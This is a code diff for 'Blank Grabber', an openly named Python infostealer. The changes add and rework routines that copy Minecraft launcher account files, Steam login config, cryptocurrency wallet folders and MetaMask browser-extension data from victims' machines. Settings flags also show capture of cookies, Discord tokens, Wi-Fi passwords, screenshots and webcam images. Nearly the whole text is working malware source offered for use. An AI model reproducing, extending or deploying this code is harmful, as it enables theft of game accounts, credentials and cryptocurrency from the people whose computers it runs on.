@@ -34,8 +34,7 @@ class Settings:
     CaptureCookies = bool("%capturecookies%")
     CaptureHistory = bool("%capturehistory%")
     CaptureDiscordTokens = bool("%capturediscordtokens%")
-    CaptureMinecraftSessionFiles = bool("%captureminecraft%")
-    CaptureRobloxCookies = bool("%captureroblox%")
+    CaptureGames = bool("%capturegames%")
     CaptureWifiPasswords = bool("%capturewifipasswords%")
     CaptureSystemInfo = bool("%capturesysteminfo%")
     CaptureScreenshot = bool("%capturescreenshot%")
@@ -324,45 +323,7 @@ class Utility:
         newdata = "\n".join(newdata).replace("\n\n", "\n")
         with open(hostfilepath, "w") as file:
             file.write(newdata)
-
-class Wallets:
-    APPDATA = os.getenv("appdata")
-    LOCALAPPDATA = os.getenv("localappdata")
     
-    @staticmethod
-    def SaveWallets(saveToDir: str) -> int:
-        count = 0
-        wallets = (
-            ("Zcash", os.path.join(Wallets.APPDATA, "Zcash")),
-            ("Armory", os.path.join(Wallets.APPDATA, "Armory")),
-            ("Bytecoin", os.path.join(Wallets.APPDATA, "Bytecoin")),
-            ("Jaxx", os.path.join(Wallets.APPDATA, "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
-            ("Exodus", os.path.join(Wallets.APPDATA, "Exodus", "exodus.wallet")),
-            ("Ethereum", os.path.join(Wallets.APPDATA, "Ethereum", "keystore")),
-            ("Electrum", os.path.join(Wallets.APPDATA, "Electrum", "wallets")),
-            ("AtomicWallet", os.path.join(Wallets.APPDATA, "atomic", "Local Storage", "leveldb")),
-            ("Guarda", os.path.join(Wallets.APPDATA, "Guarda", "Local Storage", "leveldb")),
-            ("Coinomi", os.path.join(Wallets.LOCALAPPDATA, "Coinomi", "Coinomi", "wallets")),
-        )
-
-        for name, path in wallets:
-            if os.path.isdir(path):
-                _saveToDir = os.path.join(saveToDir, name)
-                os.makedirs(_saveToDir, exist_ok= True)
-                try:
-                    shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok= True)
-                    with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
-                        file.write(path)
-                except Exception:
-                    try:
-                        shutil.rmtree(_saveToDir)
-                    except Exception:
-                        pass
-                else:
-                    count += 1
-        
-        return count
-
 class Browsers:
 
     class Chromium:
@@ -810,6 +771,7 @@ class BlankGrabber:
     WebcamPictures: int = 0
     TelegramSessions: int = 0
     WalletsCount: int = 0
+    SteamCount: int = 0
 
     def __init__(self) -> None:
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n"
@@ -831,6 +793,7 @@ class BlankGrabber:
             (self.StealTelegramSessions, False),
             (self.StealWallets, False),
             (self.StealMinecraft, False),
+            (self.StealSteam, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
             (self.GetTaskList, False),
@@ -859,21 +822,47 @@ class BlankGrabber:
 
     @Errors.Catch
     def StealMinecraft(self) -> None:
-        if Settings.CaptureMinecraftSessionFiles:
-            minecraftDir = os.path.join(os.getenv("appdata"), ".minecraft")
-            copyToDir = os.path.join(self.TempFolder, "Games", "Minecraft")
+        if Settings.CaptureGames:
+            saveToPath = os.path.join(self.TempFolder, "Games", "Minecraft")
+            userProfile = os.getenv("userprofile")
+            roaming = os.getenv("appdata")
+            minecraftPaths = {
+                 "Intent" : os.path.join(userProfile, "intentlauncher", "launcherconfig"),
+                 "Lunar" : os.path.join(userProfile, ".lunarclient", "settings", "game", "accounts.json"),
+                 "TLauncher" : os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
+                 "Feather" : os.path.join(roaming, ".feather", "accounts.json"),
+                 "Meteor" : os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
+                 "Impact" : os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
+                 "Novoline" : os.path.join(roaming, ".minectaft", "Novoline", "alts.novo"),
+                 "CheatBreakers" : os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
+                 "Microsoft Store" : os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
+                 "Rise" : os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
+                 "Rise (Intent)" : os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
+                 "Paladium" : os.path.join(roaming, "paladium-group", "accounts.json"),
+                 "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
+                 "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
+            }
 
-            if any([os.path.isfile(os.path.join(minecraftDir, filename)) for filename in ("launcher_profiles.json", "launcher_accounts_microsoft_store.json")]):
-                for name in os.listdir(minecraftDir):
-                    if not name.endswith((".exe",)):
-                        filePath = os.path.join(minecraftDir, name)
-                        copyTo = os.path.join(copyToDir, name)
-
-                        if os.path.isfile(filePath):
-                            os.makedirs(copyToDir, exist_ok= True)
-                            shutil.copy(filePath, copyTo)
-                
-                self.MinecraftSessions += 1
+            for name, path in minecraftPaths.items():
+                if os.path.isfile(path):
+                    os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
+                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
+                    self.MinecraftSessions += 1
+    
+    @Errors.Catch
+    def StealSteam(self) -> None:
+        if Settings.CaptureGames:
+            saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
+            steamPath = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
+            if os.path.isdir(steamPath):
+                loginFile = os.path.join(steamPath, "loginusers.vdf")
+                if os.path.isfile(loginFile):
+                    with open(loginFile) as file:
+                        contents = file.read()
+                    if '"RememberPassword"\t\t"1"' in contents:
+                        os.makedirs(saveToPath, exist_ok= True)
+                        shutil.copytree(steamPath, saveToPath, dirs_exist_ok= True)
+                        self.SteamCount += 1
     
     @Errors.Catch
     def StealRobloxCookies(self) -> None:
@@ -904,7 +893,73 @@ class BlankGrabber:
     def StealWallets(self) -> None:
         if Settings.CaptureWallets:
             saveToDir = os.path.join(self.TempFolder, "Wallets")
-            self.WalletsCount += Wallets.SaveWallets(saveToDir)
+
+            wallets = (
+                ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
+                ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
+                ("Bytecoin", os.path.join(os.getenv("appdata"), "Bytecoin")),
+                ("Jaxx", os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
+                ("Exodus", os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")),
+                ("Ethereum", os.path.join(os.getenv("appdata"), "Ethereum", "keystore")),
+                ("Electrum", os.path.join(os.getenv("appdata"), "Electrum", "wallets")),
+                ("AtomicWallet", os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb")),
+                ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
+                ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
+            )
+
+            browserPaths = {
+                "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
+                "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
+                "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
+                "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
+                "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
+                "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
+                "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
+                "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
+                "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
+                "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
+                "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
+                "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
+                "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
+            }
+
+            for name, path in wallets:
+                if os.path.isdir(path):
+                    _saveToDir = os.path.join(saveToDir, name)
+                    os.makedirs(_saveToDir, exist_ok= True)
+                    try:
+                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok= True)
+                        with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
+                            file.write(path)
+                        self.WalletsCount += 1
+                    except Exception:
+                        try:
+                            shutil.rmtree(_saveToDir)
+                        except Exception:
+                            pass
+            
+            for name, path in browserPaths.items():
+                    if os.path.isdir(path):
+                        for root, dirs, _ in os.walk(path):
+                            for _dir in dirs:
+                                if _dir == "Local Extension Settings":
+                                    localExtensionsSettingsDir = os.path.join(root, _dir)
+                                    for _dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
+                                        extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
+                                        if os.path.isdir(extentionPath) and os.listdir(extentionPath):
+                                            try:
+                                                metamask_browser = os.path.join(saveToDir, "Metamask ({})".format(name))
+                                                _saveToDir =  os.path.join(metamask_browser, _dir)
+                                                shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok= True)
+                                                with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
+                                                    file.write(extentionPath)
+                                                self.WalletsCount += 1
+                                            except Exception: # Permission Denied
+                                                try:
+                                                    shutil.rmtree(_saveToDir)
+                                                    if not os.listdir(metamask_browser):
+                                                        shutil.rmtree(metamask_browser)
+                                                except Exception: pass
     
     @Errors.Catch
     def StealSystemInfo(self) -> None:
@@ -1079,7 +1134,7 @@ class BlankGrabber:
         for thread in threads:
             thread.join()
         
-        if Settings.CaptureRobloxCookies:
+        if Settings.CaptureGames:
             self.StealRobloxCookies()
 
     @Errors.Catch
@@ -1285,6 +1340,7 @@ class BlankGrabber:
                             "Wallets" : self.WalletsCount,
                             "Wifi Passwords" : len(self.WifiPasswords),
                             "Minecraft Sessions" : self.MinecraftSessions,
+                            "Steam Sessions" : self.SteamCount,
                             "Screenshot" : self.Screenshot,
                             "Webcam" : self.WebcamPictures
             }
